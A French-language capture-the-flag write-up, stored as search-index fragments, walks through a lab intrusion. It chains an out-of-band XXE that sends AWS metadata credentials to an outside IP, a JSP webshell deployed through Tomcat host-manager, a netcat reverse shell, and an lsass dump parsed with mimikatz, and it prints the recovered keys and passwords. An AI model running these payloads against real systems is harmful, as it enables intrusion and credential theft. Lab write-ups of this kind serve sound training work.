XXE in emblem editor, HackerOne : https://hackerone.com/reports/347139 Ian Muscat, Out-of-band XML External Entity (OOB-XXE), Acunetix : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IV. Step 4 - SSRF to KFC Lets check this bucket ! ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l’adresse suivante : http://169.254.169.254/latest/meta-data/iam/security-credentials/ Les informations du bucket se situent ici : http://169.254.169.254/latest/dynamic/instance-identity/document Initialiser les variables d’environnement avec les informations trouvées pour se connecter : AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN Lister le contenu du bucket : aws s3 ls s3://willywonka-shop Récupérer le flag : aws s3 cp s3://willywonka-shop/Flag-04.txt . ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IV.1. Reconnaissance Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers. Cependant il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier /etc/passwd, afin de récupérer les utilisateurs du système. Parfois, il arrive que le .bash_history de l’utilisateur courant soit accessible par tout le monde, c’est ce qu’il se passe dans notre cas : [...] sudo vim flag.txt curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ [...] Pour des raisons de lisibilité, j’ai tronqué le contenu du fichier pour ne garder que les quelques lignes intéressantes. Revenons à notre XXE, jusqu’à présent seul le schéma file:// a été utilisé. Amazon utilise le schéma http:// pour récupérer les informations du bucket S3. Le .bash_history trouvé précédemment nous donne une de ces requêtes : http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IV.2. Exploitation En remplaçant file:///flag.txt par http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ dans la charge ro.dtd, il est possible de récupérer les informations de connexion. \u003c!ENTITY % secret1 SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/\"\u003e \u003c!ENTITY % template \"\u003c!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'\u003e\"\u003e { \"Code\":\"Success\", \"LastUpdated\":\"2019-07-10T14:45:25Z\", \"Type\":\"AWS-HMAC\", \"AccessKeyId\":\"ASIAZ47IG35A4F6ZY2ML\", \"SecretAccessKey\":\"bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn\", \"Token\":\"AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=\", \"Expiration\":\"2019-07-10T20:55:48Z\" } Pour accéder au contenu d’un bucket S3, il faut différentes informations secrètes, mais aussi la zone du bucket : \u003c!ENTITY % secret1 SYSTEM \"http://169.254.169.254/latest/dynamic/instance-identity/document\"\u003e \u003c!ENTITY % template \"\u003c!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'\u003e\"\u003e { \"devpayProductCodes\":null, \"marketplaceProductCodes\":null, \"accountId\":\"680702435137\", \"availabilityZone\":\"eu-west-3c\", \"ramdiskId\":null, \"kernelId\":null, \"pendingTime\":\"2019-07-04T16:23:26Z\", \"architecture\":\"x86_64\", \"privateIp\":\"172.31.39.217\", \"version\":\"2017-09-30\", \"region\":\"eu-west-3\", \"imageId\":\"ami-0119667e27598718e\", \"billingProducts\":null, \"instanceId\":\"i-0defb90fb5aafe95b\", \"instanceType\":\"t2.medium\" } Lorsque toutes ces informations sont réunies, en configurant les différentes variables d’environnement, il est possible de se connecter au bucket. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IV.3. Connexion au bucket s3 (KaliVM) ➜ export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL (KaliVM) ➜ export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ (KaliVM) ➜ export AWS_DEFAULT_REGION=eu-west-3 (KaliVM) ➜ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4= (KaliVM) ➜ aws s3 ls 2019-07-04 18:41:42 willywonka-shop La connexion étant établie, nous sommes en mesure de récupérer son contenu : (KaliVM) ➜ aws s3 ls 2019-07-04 18:41:42 willywonka-shop (KaliVM) ➜ aws s3 ls s3://willywonka-shop/ PRE images/ PRE tools/ 2019-07-05 13:54:47 65 Flag-04.txt (KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools PRE tools/ (KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/ PRE docs/ PRE vpn/ 2019-07-05 10:15:18 0 (KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/docs/ 2019-07-05 13:15:12 0 2019-07-05 13:15:32 1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\\'s Oddest Settings.pdf 2019-07-05 13:15:45 1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf (KaliVM) ➜ aws s3 cp s3://willywonka-shop/Flag-04.txt . download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt (KaliVM) ➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn . download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn (KaliVM) ➜ cat Flag-04.txt 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528 En plus du flag de cette étape, il y a un fichier VPN wonka_internal.ovpn dans le bucket, qui laisse présager un active directory. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"IV.5. Flag 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources @christophetd, Abusing the AWS metadata service using SSRF vulnerabilities, Blog de Christophe Tafani-Dereeper : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/ notsosecure team, Exploiting SSRF in AWS Elastic Beanstalk, notsosecure : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:5:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V. Step 5 - Tom(cat) and Jerry Lets get the flag at the root of your first blood ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Se connecter au VPN récupéré dans le bucket ; Une nouvelle route est apparue : 172.16.42.0/24 ; Effectuer une énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ; Utiliser dirsearch avec une wordlist tomcat (seclist), et trouver la page /host-manager/ ; Se connecter avec les identifiants tomcat : tomcat ; Monter un partage samba nommé data avec un webshell (cmd.war) à l’intérieur ; Déployer le webshell en tant que nouvelle application via les UNC path ; Accéder au webshell à l’adresse : http://maki-lab:8080/cmd/index.jsp?cmd=whoami ; Utiliser netcat pour faire un reverse shell. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.1. Reconnaissance Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait : ➜ ip r | grep tun0 10.8.0.1 via 10.8.0.17 dev tun0 10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 172.16.42.0/24 via 10.8.0.17 dev tun0 Il existe plusieurs techniques de reconnaissances afin de trouver tous les hôtes de ce réseau: Ping scan : rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ; Port scan : Retenir quelques ports connus et vérifier s’ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien. Note : Personnellement je fais un premier masscan avec environ 100 ports connus sur l’ensemble du réseau, puis un second masscan avec l’ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, un nmap spécifique sur les ports et hôtes trouvés. C’est la méthode la plus rapide que j’ai pu trouver jusqu’à présent. CI-dessous le premier masscan : (KaliVM) ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24 Discovered open port 445/tcp on 172.16.42.5 Discovered open port 53/tcp on 172.16.42.5 Discovered open port 445/tcp on 172.16.42.101 Discovered open port 445/tcp on 172.16.42.11 Avec cette méthode, trois machines ressortent : 172.16.42.5 172.16.42.11 172.16.42.101 V.1.a. 172.16.42.5 (DC01-WW2) (KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5 Discovered open port 49669/tcp on 172.16.42.5 Discovered open port 445/tcp on 172.16.42.5 Discovered open port 53/udp on 172.16.42.5 Discovered open port 53/tcp on 172.16.42.5 Discovered open port 3268/tcp on 172.16.42.5 Discovered open port 50206/tcp on 172.16.42.5 Discovered open port 593/tcp on 172.16.42.5 Discovered open port 636/tcp on 172.16.42.5 Discovered open port 49687/tcp on 172.16.42.5 (KaliVM) ➜ cat out_mass_5 | cut -d ' ' -f4 | sed 's/\\/.*$//' | tr '\\n' ',' 49669,445,53,53,3268,50206,593,636,49687 (KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Microsoft DNS 445/tcp open microsoft-ds? syn-ack 593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack 3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: factory.lan0., Site: Default-First-Site-Name) 49669/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0 49687/tcp open msrpc syn-ack Microsoft Windows RPC 50206/tcp open msrpc syn-ack Microsoft Windows RPC [...] TCP Sequence Prediction: Difficulty=253 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: DC01-WW2; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 40427/tcp): CLEAN (Timeout) | Check 2 (port 46791/tcp): CLEAN (Timeout) | Check 3 (port 49455/udp): CLEAN (Timeout) | Check 4 (port 14211/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-07-11 13:39:58 |_ start_date: 1601-01-01 00:09:21 Cette machine ressemble à un Domain Controller, et ce pour plusieurs raisons : Le port 53 (DNS) est caractéstique d’un AD Le port 3268 (LDAP) mentionne le domaine factory.lan Le nom d’hôte est plutôt explicite : DC01-WW2 V.1.b. 172.16.42.11 (KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11 Discovered open port 8080/tcp on 172.16.42.11 Discovered open port 445/tcp on 172.16.42.11 (KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11 PORT STATE SERVICE REASON VERSION 445/tcp open microsoft-ds? syn-ack 8080/tcp open http-proxy syn-ack | fingerprint-strings: | ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.2. Enumération du serveur web Après quelques tentatives infructueuses sur les différents serveurs SMB, il est temps de se concentrer sur le serveur web : http://172.16.42.11:8080/. En naviguant sur le site, il est possible de trouver une cartographie du réseau : http://172.16.42.11:8080/infra.jsp L’extension jsp nous conforte dans l’idée que nous sommes en présence d’un serveur tomcat, la page 404 la confirme. L’exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes : (KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt [15:08:17] 302 - 0B - /host-manager -\u003e /host-manager/ [15:08:17] 401 - 2KB - /host-manager/html/%2A [15:08:17] 302 - 0B - /manager -\u003e /manager/ D’ordinaire, la page manager est la solution de facilité : avec des identifiants par défaut, il suffit de générer un webshell avec l’extension war et de l’uploader. Dans notre cas, cette page est … Indisponible : Dans les résultats du dirsearch, il y a aussi la page /host-manager. Cette page est protégée par une Basic authentification, heureusement les identifiants par défaut de Tomcat fonctionnent : tomcat : tomcat Certilience a écrit un très bon guide concernant cette attaque : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.3. Mise en place de l’exploitation N’étant pas un grand fan de Metasploit, j’essaie de l’utiliser le moins possible, et ce surtout lorsque d’autres solutions existent. Une d’elle consiste à récupérer un webshell “standard”, plutôt que de générer une charge avec un meterpreter. En effet, une archive war consiste tout simplement en une archive zip avec une hiérarchie particulière : (KaliVM) ➜ tree . . ├── index.jsp ├── META-INF │ └── MANIFEST.MF └── WEB-INF └── web.xml La charge malveillante se situe dans le fichier index.jsp : \u003cFORM METHOD=GET ACTION='index.jsp'\u003e \u003cINPUT name='cmd' type=text\u003e \u003cINPUT type=submit value='Run'\u003e \u003c/FORM\u003e \u003c%@ page import=\"java.io.*\" %\u003e \u003c% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"\u003c/br\u003e\"; } } catch(IOException e) { e.printStackTrace(); } } %\u003e \u003cpre\u003e\u003c%=output %\u003e\u003c/pre\u003e La charge ci-dessus provient du dépôt de tennc : https://github.com/tennc/webshell L’archive war utilisée lors de l’exploitation peut être téléchargée ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs V.3.a. Nouvel hôte En suivant les indications de Certilience, on ajoute une entrée dans le fichier /etc/hosts de notre machine afin de lier l’IP du serveur tomcat à un hostname : (KaliVM) ➜ sudo echo \"172.16.42.11 maki-lab\" \u003e\u003e /etc/hosts Cette étape sera utile lors du déploiement de la nouvelle application via les UNC path. V.3.b. SMB server Il est impératif de mettre en place un partage samba (smbserver.py) pour que le serveur Tomcat puisse récupérer notre application malveillante : (KaliVM) ➜ sudo smbserver.py -smb2support data . La commande ci-dessus ouvre un partage nommé data dans le dossier courant, où se trouve l’archive war. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.4. Exploitation Les préparatifs étant terminés, il est temps de déployer le webshell : De l’activité est visible sur les logs du serveur SMB lors du déploiement de notre application. On peut finalement accéder à cette application avec l’URL suivante : http://maki-lab:8080/cmd/index.jsp ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.5. Reverse shell Pour récupérer un shell plus ou moins interactif, il est possible de déposer le binaire netcat dans le partage data, créé pour l’exploitation précédente. Sous Windows, il est possible d’exécuter des binaires distants grâce aux UNC path. V.5.a. Terminal 1 - Hôte Le binaire rlwrap (readline wrapper) sert d’historique de commandes, mais aussi d’interface entre le clavier local et distant. L’utiliser lors d’un reverse shell permet à l’attaquant de pouvoir utiliser les flèches de son clavier correctement et d’avoir l’historique des commandes de la session : (KaliVM) ➜ rlwrap ncat -klvp 12345 V.5.b. Application malveillante - Serveur tomcat L’UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et établir ainsi une connexion sur le port 12345 : (SRV01-INTRANET) ➜ \\\\10.8.0.10\\data\\nc64.exe -e cmd.exe 10.8.0.10 12345 Cette méthode permet de récupérer un accès shell plus ou moins interactif et plus ou moins stable. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"V.5. Flag 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:7","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources SecList, Discovery Web-content Tomcat, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt Pôle audit de Certilience, Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ Eternallybored, Download netcat Windows binaries; eternallybored.org : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:6:8","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VI. Step 6 - Mimikatz you said ? SHA256(adminServer’s passwd) ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Exécuter procdump.exe sur le serveur tomcat (SRV01-INTRANET) ; Récupérer le minidump du processus lsass.exe ; Retrouver les identifiants stockés grâce à mimikatz en local : adminserver : factory.lan\\adminServer : #3LLe!!estOuL@Poulette. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VI.1. Post exploitation Lorsqu’un accès privilégié est obtenu sur un serveur, il est naturel d’essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l’occurrence, Mimikatz va chercher les identifiants dans la mémoire du processus de lsass.exe. Une autre méthode, plus difficile à détecter pour de potentiels anti-virus, consiste à récupérer la mémoire de ce processus grâce à procdump.exe. Ce binaire est développé et signé par Microsoft et fait partie des Windows Sysinternals. Mimikatz est capable de charger un dump mémoire de ce processus en local et d’en extraire les identifiants. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VI.2. Getting lsass minidump L’exécution de procdump.exe se fait comme pour netcat : via les UNC path. (SRV01-INTRANET) ➜ \\\\10.8.0.10\\data\\procdump64.exe -ma lsass.exe lsadump Toujours avec les UNC path, on copie les fichiers sur un partage distant : (SRV01-INTRANET) ➜ copy lsadump.dmp \\\\10.8.0.10\\data\\lsadump.dmp Le minidump est disponible ici : https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VI.3. Récupération des mots de passe dans le minidump Comme mentionné précédemment, Mimikatz est capable de lire un minidump en local. C’est à ce moment que CommandoVM entre en jeu. (CommandoVM) ➜ .\\mimikatz.exe # privilege::debug Privilege '20' OK # sekurlsa::Minidump lsassdump.dmp Switch to MINIDUMP : 'lsassdump.dmp' # sekurlsa::logonPasswords Opening : 'lsassdump.dmp' file for minidump... [...] Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : SRV01-INTRANET$ Domain : FACTORY Logon Server : (null) Logon Time : 05/07/2019 12:16:10 SID : S-1-5-18 msv : tspkg : wdigest : * Username : SRV01-INTRANET$ * Domain : FACTORY * Password : (null) kerberos : * Username : srv01-intranet$ * Domain : FACTORY.LAN * Password : (null) ssp : credman : [00000000] * Username : factory.lan\\adminServer * Domain : 172.16.42.101 * Password : #3LLe!!estOuL@Poulette Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les identifiants récupérés sont : factory.lan\\adminServer : #3LLe!!estOuL@Poulette ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VI.4. Flag 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources sevagas, swap_digger, GitHub : https://github.com/sevagas/swap_digger Microsoft, Windows Sysinternals, Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/ Sebastien Macke - @lanjelot, Dumping Windows Credentials, securusglobal : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/ cyberarms, Grabbing Passwords from Memory using Procdump and Mimikatz, cyberarms : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/ ired.team, Credential Access \u0026 Dumping, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping Mark Russinovich and Andrew Richards, ProcDump v9.0, Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:7:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VII. Step 7 - Spreading love Sharing is caring ;) ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Essayer d’accéder aux partages du réseau avec les identifiants récupérés ; Trouver le partage Users sur le serveur 172.16.42.5 ; Le parcourir et trouver les identifiants : factory.lan\\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:8:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"VII.1. Reconnaissance Dans les scans réalisés lors de l’étape 5 (cf. V.1. Reconnaissance), on remarque que toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échoué, on peut réitérer les tests avec les identifiants de adminServer. 